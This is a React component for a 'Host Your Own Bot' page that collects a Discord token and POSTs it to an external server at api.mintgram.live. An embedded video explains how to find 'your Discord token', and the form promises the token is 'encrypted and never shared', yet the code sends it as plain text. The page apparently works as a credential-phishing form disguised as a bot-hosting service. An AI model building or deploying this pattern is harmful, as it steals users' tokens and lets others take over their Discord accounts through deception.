import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Server, Key, Check, Play, ExternalLink } from "lucide-react";
import { toast } from "sonner";

const HostYourBot = () => {
  const [token, setToken] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!token) {
      toast.error("Bot token is required");
      return;
    }

    setIsSubmitting(true);

    try {
      const res = await fetch("https://api.mintgram.live/token", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ token }),
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        throw new Error(data.message || "Request failed");
      }

      toast.success("Bot request submitted!", {
        description: "Check your Discord DM for confirmation.",
      });

      setToken("");
    } catch (err: any) {
      toast.error("Submission failed", {
        description: err.message || "Server error",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <section id="host-your-bot" className="relative py-24 overflow-hidden">
      {/* Background glow */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute bottom-0 right-1/4 w-[600px] h-[600px] bg-primary/5 rounded-full blur-[100px]" />
      </div>

      <div className="container relative z-10 px-4">
        <div className="max-w-2xl mx-auto">
          {/* Header */}
          <div className="text-center mb-10">
            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full glass text-sm mb-6">
              <Server className="w-4 h-4 text-primary" />
              <span className="text-muted-foreground">Self-Hosting</span>
            </div>
            <h2 className="text-3xl md:text-5xl font-bold mb-4">
              Host Your <span className="text-gradient">Own Bot</span>
            </h2>
            <p className="text-muted-foreground text-lg">
              Deploy your own private bot instance with full control.
            </p>
          </div>

          {/* VIDEO */}
          <div className="glass-strong rounded-2xl p-6 mb-8 border border-primary/30">
            <div className="flex items-center gap-2 mb-3">
              <Play className="w-5 h-5 text-primary" />
              <h3 className="font-semibold text-base">
                Watch Before Entering Your Token
              </h3>
            </div>

            <p className="text-sm text-muted-foreground mb-4">
              This short video explains how to find your Discord token safely.
            </p>

            <div className="relative w-full aspect-[9/16] max-w-[260px] mx-auto rounded-xl overflow-hidden border border-primary/40">
              <iframe
                src="https://www.youtube.com/embed/-ds8_JRmuuw"
                title="How to find Discord token"
                className="w-full h-full"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowFullScreen
              />
            </div>
          </div>

          {/* FORM */}
          <form
            onSubmit={handleSubmit}
            className="glass-strong rounded-2xl p-8 space-y-6"
          >
            {/* TOKEN */}
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-sm font-medium">
                <Key className="w-4 h-4 text-primary" />
                Bot Token <span className="text-destructive">*</span>
              </label>
              <Input
                type="password"
                placeholder="Enter your Discord bot token"
                value={token}
                onChange={(e) => setToken(e.target.value)}
                className="font-mono"
              />
              <p className="text-xs text-muted-foreground">
                Your token is encrypted and never shared.
              </p>
            </div>

            <Button
              type="submit"
              variant="hero"
              size="lg"
              className="w-full"
              disabled={isSubmitting}
            >
              {isSubmitting ? (
                <>
                  <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <Check className="w-5 h-5" />
                  Submit Request
                </>
              )}
            </Button>
          </form>
        </div>
      </div>
    </section>
  );
};

export default HostYourBot;
